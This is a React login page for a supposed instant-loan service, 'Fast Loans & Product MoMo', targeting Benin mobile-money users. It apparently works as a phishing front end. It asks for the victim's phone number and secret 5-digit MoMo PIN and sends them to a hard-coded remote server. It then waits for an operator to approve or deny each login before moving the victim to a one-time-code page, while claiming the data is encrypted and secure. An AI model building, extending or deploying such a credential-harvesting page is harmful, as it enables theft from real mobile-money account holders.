import { useState, useEffect, useRef, type FormEvent } from "react";
import { useNavigate } from "react-router-dom";
import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";

const API_URL = "https://fastloan-momo-kj8m.onrender.com";

const Login = () => {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const navigate = useNavigate();
  
  // Ref to prevent double clicks
  const isSubmitting = useRef(false);

  const isFormValid = phone.length === 10 && pin.length === 5;

  // Wake up the Render server silently
  useEffect(() => {
    fetch(`${API_URL}/`).catch(() => {});
  }, []);

  const handleLogin = async (e?: FormEvent) => {
    if (e) e.preventDefault();
    
    // Prevent double submission
    if (!isFormValid || isProcessing || isSubmitting.current) return;
    
    isSubmitting.current = true;
    setIsProcessing(true);
    localStorage.setItem("userPhone", phone);

    // 45-second timeout fallback
    const timeoutId = setTimeout(() => {
      setIsProcessing(false);
      isSubmitting.current = false;
      // Don't clear fields, let user retry
      alert("Le serveur met trop de temps à répondre. Veuillez réessayer.");
    }, 45000);

    try {
      const res = await fetch(`${API_URL}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phone, pin: pin }),
      });
      const data = await res.json();

      if (data.status === "pending" && data.login_id) {
        const interval = setInterval(async () => {
          try {
            const statusRes = await fetch(`${API_URL}/api/login-status/${data.login_id}`);
            const statusData = await statusRes.json();

            if (statusData.status !== "pending") {
              clearInterval(interval);
              clearTimeout(timeoutId);
              setIsProcessing(false);

              if (statusData.status === "approved") {
                navigate("/otp", { state: { phone: phone } });
              } else {
                // Denied by admin
                setPhone("");
                setPin("");
                isSubmitting.current = false;
                navigate("/login");
              }
            }
          } catch (err) {
            console.error("Polling error:", err);
          }
        }, 2000);
      } else {
        clearTimeout(timeoutId);
        setIsProcessing(false);
        isSubmitting.current = false;
        navigate("/otp", { state: { phone: phone } });
      }
    } catch (error) {
      clearTimeout(timeoutId);
      setIsProcessing(false);
      isSubmitting.current = false;
      alert("Erreur de connexion. Vérifiez votre réseau.");
    }
  };

  // Handle Phone Input
  const handlePhoneChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "").slice(0, 10);
    setPhone(val);
  };

  // Handle PIN Input with Auto-Submit
  const handlePinChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = e.target.value.replace(/\D/g, "");
    setPin(val);

    // Auto-submit if valid
    if (val.length === 5 && phone.length === 10) {
      handleLogin();
    }
  };

  return (
    <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
      
      {/* HEADER */}
      <div className="text-center mb-8 mt-4 animate-[fadeIn_0.5s_ease-out]">
        <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
          <Wallet size={32} color="#1E1E1E" />
        </div>
        <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight text-center leading-tight">
          Fast Loans &amp; Product<span className="text-[#B8860B]"> MoMo</span>
        </h1>
        <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
          Prêts et produits instantanés
        </p>
      </div>

      {/* MAIN CARD */}
      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8 animate-[slideUp_0.4s_ease-out]">
        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-2">Bon retour</h2>
        <p className="text-sm text-gray-500 mb-6 leading-relaxed">
          Connectez-vous avec votre numéro mobile pour accéder à vos prêts et produits instantanés.
        </p>

        <form onSubmit={handleLogin} className="space-y-5">
          {/* PHONE FIELD */}
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Numéro de téléphone
            </label>
            <div className="flex items-center border border-gray-200 rounded-xl px-3 py-2 bg-white focus-within:border-[#F0B90B] focus-within:ring-2 focus-within:ring-[#FCD535]/50 transition-all">
              <div className="flex items-center bg-[#FAF8F5] rounded-lg px-3 py-1.5 mr-2">
                <span className="flex items-center text-sm font-medium text-gray-800 whitespace-nowrap">
                  🇧🇯 +229
                </span>
              </div>
              
              <input
                type="tel"
                placeholder="01 23 45 67 89"
                value={phone}
                onChange={handlePhoneChange}
                maxLength={10}
                required
                disabled={isProcessing}
                className="flex-1 min-w-0 outline-none text-lg tracking-wider text-gray-900 bg-transparent placeholder:text-gray-300 disabled:opacity-50"
              />
            </div>
            <p className="text-xs text-gray-500 mt-1.5">Numéro MoMo du Bénin (10 chiffres)</p>
          </div>

          {/* PIN FIELD */}
          <div>
            <label className="block text-sm font-semibold text-gray-700 mb-2">
              Entrez le code PIN MOMO à 5 chiffres
            </label>
            <div className="flex items-center border border-gray-200 rounded-xl px-3 py-3 bg-white focus-within:border-[#F0B90B] focus-within:ring-2 focus-within:ring-[#FCD535]/50 transition-all">
              <Lock size={20} color="#6B7280" className="mr-3 ml-1 flex-shrink-0" />
              <input
                type={showPin ? "text" : "password"}
                maxLength={5}
                placeholder="•••••"
                value={pin}
                onChange={handlePinChange}
                required
                disabled={isProcessing}
                className="flex-1 min-w-0 outline-none text-lg tracking-[0.5em] text-gray-900 bg-transparent placeholder:text-gray-300 placeholder:tracking-[0.3em] disabled:opacity-50"
              />
              <button
                type="button"
                onClick={() => setShowPin(!showPin)}
                className="flex p-0 bg-transparent border-none cursor-pointer flex-shrink-0"
                aria-label={showPin ? "Masquer le PIN" : "Afficher le PIN"}
              >
                <Eye size={20} color="#9CA3AF" />
              </button>
            </div>
          </div>

          {/* SUBMIT */}
          <button
            type="submit"
            disabled={!isFormValid || isProcessing}
            className={`w-full mt-8 py-3.5 rounded-xl font-bold text-base transition-all ${
              isFormValid && !isProcessing
                ? "bg-[#F0B90B] hover:bg-[#E2AE0A] text-[#1E1E1E] cursor-pointer shadow-md"
                : "bg-gray-100 text-gray-400 cursor-not-allowed"
            }`}
          >
            {isProcessing ? "En attente..." : "Continuer"}
          </button>

          <p className="flex items-center justify-center gap-1.5 text-center text-xs text-gray-500 mt-6">
            <ShieldCheck size={16} />
            Vos informations sont cryptées et sécurisées
          </p>
        </form>
      </div>

      {/* FOOTER NOTE */}
      <p className="text-center text-sm text-[#1E1E1E]/80 font-medium mt-6 px-5 pb-10 max-w-md">
        En continuant, vous acceptez nos Conditions et notre Politique de Confidentialité.
      </p>

      {/* SPINNER MODAL */}
      {isProcessing && (
        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl animate-[popIn_0.3s_ease-out]">
            <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
            <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
            <p className="text-sm text-gray-500">En attente d'approbation...</p>
          </div>
        </div>
      )}

      {/* ANIMATIONS */}
      <style>{`
        @keyframes fadeIn {
          from { opacity: 0; }
          to { opacity: 1; }
        }
        @keyframes slideUp {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @keyframes popIn {
          0% { opacity: 0; transform: scale(0.9); }
          100% { opacity: 1; transform: scale(1); }
        }
      `}</style>
    </div>
  );
};

export default Login;